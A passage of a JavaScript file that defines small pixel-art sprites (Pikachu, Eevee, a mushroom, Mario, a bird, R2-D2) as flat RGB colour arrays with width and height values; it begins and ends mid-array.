255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 201, 15, 247, 255, 4, 247, 255, 4, 247, 255, 4, 255, 0, 0, 255, 0, 0, 247, 255, 4, 255, 201, 15, 255, 201, 15, 255, 201, 15, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 201, 15, 247, 255, 4, 247, 255, 4, 247, 255, 4, 255, 0, 0, 255, 201, 15, 255, 201, 15, 255, 201, 15, 143, 113, 8, 143, 113, 8, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 247, 255, 4, 255, 201, 15, 255, 201, 15, 255, 201, 15, 255, 201, 15, 255, 201, 15, 255, 201, 15, 247, 255, 4, 255, 201, 15, 255, 201, 15, 255, 201, 15, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 247, 255, 4, 247, 255, 4, 247, 255, 4, 247, 255, 4, 247, 255, 4, 0, 0, 0, 255, 201, 15, 255, 201, 15, 143, 113, 8, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 201, 15, 247, 255, 4, 247, 255, 4, 247, 255, 4, 0, 0, 0, 247, 255, 4, 255, 201, 15, 255, 201, 15, 255, 201, 15, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 201, 15, 0, 0, 0, 255, 201, 15, 255, 201, 15, 255, 201, 15, 255, 201, 15, 0, 0, 0, 255, 201, 15, 255, 201, 15, 255, 201, 15, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 247, 255, 4, 247, 255, 4, 247, 255, 4, 255, 201, 15, 255, 201, 15, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 201, 15, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 247, 255, 4, 247, 255, 4, 255, 201, 15, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255];
pika.width = 19;
pika.height = 21;
var evee = [0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 213, 168, 111, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 213, 168, 111, 213, 168, 111, 211, 128, 22, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 213, 168, 111, 213, 168, 111, 0, 0, 0, 0, 0, 0, 255, 255, 255, 0, 0, 0, 255, 255, 255, 0, 0, 0, 211, 128, 22, 211, 128, 22, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 213, 168, 111, 213, 168, 111, 129, 129, 129, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 211, 128, 22, 213, 168, 111, 213, 168, 111, 213, 168, 111, 211, 128, 22, 0, 0, 0, 213, 168, 111, 213, 168, 111, 0, 0, 0, 211, 128, 22, 0, 0, 0, 213, 168, 111, 213, 168, 111, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 213, 168, 111, 213, 168, 111, 213, 168, 111, 213, 168, 111, 211, 128, 22, 211, 128, 22, 0, 0, 0, 0, 0, 0, 211, 128, 22, 0, 0, 0, 211, 128, 22, 213, 168, 111, 255, 255, 255, 0, 0, 0, 255, 255, 255, 0, 0, 0, 213, 168, 111, 213, 168, 111, 213, 168, 111, 213, 168, 111, 213, 168, 111, 211, 128, 22, 211, 128, 22, 211, 128, 22, 211, 128, 22, 0, 0, 0, 0, 0, 0, 211, 128, 22, 211, 128, 22, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 213, 168, 111, 213, 168, 111, 213, 168, 111, 213, 168, 111, 0, 0, 0, 129, 129, 129, 211, 128, 22, 211, 128, 22, 0, 0, 0, 213, 168, 111, 211, 128, 22, 0, 0, 0, 211, 128, 22, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 213, 168, 111, 213, 168, 111, 213, 168, 111, 211, 128, 22, 255, 255, 255, 129, 129, 129, 211, 128, 22, 211, 128, 22, 0, 0, 0, 213, 168, 111, 211, 128, 22, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 213, 168, 111, 213, 168, 111, 211, 128, 22, 211, 128, 22, 0, 0, 0, 0, 0, 0, 211, 128, 22, 211, 128, 22, 0, 0, 0, 213, 168, 111, 0, 0, 0, 211, 128, 22, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 211, 128, 22, 211, 128, 22, 211, 128, 22, 211, 128, 22, 0, 0, 0, 0, 0, 0, 213, 168, 111, 0, 0, 0, 211, 128, 22, 211, 128, 22, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 213, 168, 111, 213, 168, 111, 0, 0, 0, 211, 128, 22, 211, 128, 22, 211, 128, 22, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 213, 168, 111, 213, 168, 111, 0, 0, 0, 0, 0, 0, 0, 0, 0, 211, 128, 22, 211, 128, 22, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 211, 128, 22, 0, 0, 0, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 211, 128, 22, 211, 128, 22, 0, 0, 0, 211, 128, 22, 211, 128, 22, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 213, 168, 111, 211, 128, 22, 213, 168, 111, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 250, 5, 255, 250, 5, 255, 250, 5, 255, 250, 5, 0, 0, 0, 255, 250, 5, 255, 250, 5, 255, 250, 5, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 250, 5, 255, 250, 5, 255, 250, 5, 255, 250, 5, 255, 250, 5, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 250, 5, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 250, 5, 255, 250, 5, 255, 250, 5, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255];
evee.width = 17;
evee.height = 17;
var shroom = [255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 0, 0, 255, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 255, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 0, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 0, 0, 0, 0, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 255, 0, 0, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 0, 0, 255, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 0, 0, 255, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 255, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 0, 0, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 0, 0, 0, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 219, 133, 255, 219, 133, 0, 0, 0, 255, 219, 133, 255, 219, 133, 0, 0, 0, 255, 219, 133, 255, 219, 133, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 219, 133, 255, 219, 133, 255, 219, 133, 0, 0, 0, 255, 219, 133, 255, 219, 133, 0, 0, 0, 255, 219, 133, 255, 219, 133, 255, 219, 133, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 219, 133, 255, 219, 133, 255, 219, 133, 255, 219, 133, 255, 219, 133, 255, 219, 133, 255, 219, 133, 255, 219, 133, 255, 219, 133, 255, 219, 133, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 219, 133, 255, 219, 133, 255, 219, 133, 255, 219, 133, 255, 219, 133, 255, 219, 133, 255, 219, 133, 255, 219, 133, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 213, 168, 111, 211, 128, 22, 213, 168, 111, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 250, 5, 255, 250, 5, 255, 250, 5, 255, 250, 5, 0, 0, 0, 255, 250, 5, 255, 250, 5, 255, 250, 5, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 250, 5, 255, 250, 5, 255, 250, 5, 255, 250, 5, 255, 250, 5, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 250, 5, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 250, 5, 255, 250, 5, 255, 250, 5, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255];
shroom.width = 16;
shroom.height = 16;
var mario = [255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 123, 109, 63, 123, 109, 63, 123, 109, 63, 255, 170, 54, 255, 170, 54, 123, 109, 63, 255, 170, 54, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 123, 109, 63, 255, 170, 54, 123, 109, 63, 255, 170, 54, 255, 170, 54, 255, 170, 54, 123, 109, 63, 255, 170, 54, 255, 170, 54, 255, 170, 54, 255, 170, 54, 255, 255, 255, 123, 109, 63, 255, 170, 54, 123, 109, 63, 123, 109, 63, 255, 170, 54, 255, 170, 54, 255, 170, 54, 123, 109, 63, 255, 170, 54, 255, 170, 54, 255, 170, 54, 255, 255, 255, 123, 109, 63, 123, 109, 63, 255, 170, 54, 255, 170, 54, 255, 170, 54, 255, 170, 54, 123, 109, 63, 123, 109, 63, 123, 109, 63, 123, 109, 63, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 170, 54, 255, 170, 54, 255, 170, 54, 255, 170, 54, 255, 170, 54, 255, 170, 54, 255, 170, 54, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 123, 109, 63, 123, 109, 63, 255, 0, 0, 123, 109, 63, 123, 109, 63, 123, 109, 63, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 123, 109, 63, 123, 109, 63, 123, 109, 63, 255, 0, 0, 123, 109, 63, 123, 109, 63, 255, 0, 0, 123, 109, 63, 123, 109, 63, 123, 109, 63, 255, 255, 255, 123, 109, 63, 123, 109, 63, 123, 109, 63, 123, 109, 63, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 123, 109, 63, 123, 109, 63, 123, 109, 63, 123, 109, 63, 255, 170, 54, 255, 170, 54, 123, 109, 63, 255, 0, 0, 255, 222, 5, 255, 0, 0, 255, 0, 0, 255, 222, 5, 255, 0, 0, 123, 109, 63, 255, 170, 54, 255, 170, 54, 255, 170, 54, 255, 170, 54, 255, 170, 54, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 170, 54, 255, 170, 54, 255, 170, 54, 255, 170, 54, 255, 170, 54, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 170, 54, 255, 170, 54, 255, 255, 255, 255, 255, 255, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 255, 255, 255, 255, 255, 255, 0, 0, 255, 0, 0, 255, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 123, 109, 63, 123, 109, 63, 123, 109, 63, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 123, 109, 63, 123, 109, 63, 123, 109, 63, 255, 255, 255, 123, 109, 63, 123, 109, 63, 123, 109, 63, 123, 109, 63, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 123, 109, 63, 123, 109, 63, 123, 109, 63, 123, 109, 63];
mario.width = 12;
mario.height = 16;
var bird = [255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 104, 183, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 104, 183, 255, 104, 183, 255, 104, 183, 255, 104, 183, 255, 104, 183, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 104, 183, 255, 104, 183, 255, 104, 183, 255, 104, 183, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 104, 183, 255, 104, 183, 255, 104, 183, 255, 104, 183, 255, 104, 183, 255, 0, 0, 0, 255, 255, 255, 0, 0, 0, 104, 183, 255, 104, 183, 255, 104, 183, 255, 104, 183, 255, 104, 183, 255, 104, 183, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 104, 183, 255, 104, 183, 255, 104, 183, 255, 104, 183, 255, 104, 183, 255, 104, 183, 255, 104, 183, 255, 0, 0, 0, 104, 183, 255, 104, 183, 255, 104, 183, 255, 104, 183, 255, 104, 183, 255, 104, 183, 255, 104, 183, 255, 104, 183, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 104, 183, 255, 104, 183, 255, 104, 183, 255, 104, 183, 255, 104, 183, 255, 0, 0, 0, 104, 183, 255, 104, 183, 255, 104, 183, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 104, 183, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 104, 183, 255, 104, 183, 255, 104, 183, 255, 104, 183, 255, 104, 183, 255, 104, 183, 255, 104, 183, 255, 104, 183, 255, 104, 183, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 104, 183, 255, 104, 183, 255, 104, 183, 255, 104, 183, 255, 104, 183, 255, 104, 183, 255, 104, 183, 255, 104, 183, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 170, 54, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 104, 183, 255, 104, 183, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 104, 183, 255, 104, 183, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 104, 183, 255, 104, 183, 255, 104, 183, 255, 104, 183, 255, 104, 183, 255, 104, 183, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 104, 183, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 104, 183, 255, 104, 183, 255, 104, 183, 255, 104, 183, 255, 104, 183, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 104, 183, 255, 104, 183, 255, 104, 183, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 104, 183, 255, 104, 183, 255, 104, 183, 255, 104, 183, 255, 104, 183, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 104, 183, 255, 104, 183, 255, 104, 183, 255, 104, 183, 255, 104, 183, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 104, 183, 255, 104, 183, 255, 104, 183, 255, 104, 183, 255, 104, 183, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 104, 183, 255, 104, 183, 255, 104, 183, 255, 104, 183, 255, 104, 183, 255, 104, 183, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 104, 183, 255, 104, 183, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 104, 183, 255, 104, 183, 255, 104, 183, 255, 104, 183, 255, 104, 183, 255, 104, 183, 255, 104, 183, 255, 104, 183, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 104, 183, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 104, 183, 255, 0, 0, 0, 104, 183, 255, 104, 183, 255, 104, 183, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 104, 183, 255, 0, 0, 0, 104, 183, 255, 104, 183, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255];
bird.width = 22;
bird.height = 18;
var r2d2 = [255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 255, 0, 0, 0, 0, 0, 255, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 0, 0, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 255, 0, 0, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 0, 0, 255, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 0, 0, 255, 255, 255, 255, 47, 47, 47, 0, 0, 255, 0, 0, 255, 0, 0, 255, 255, 255, 255, 0, 0, 255, 0, 0, 255, 255, 255, 255, 0, 0, 0, 255, 255, 255, 255, 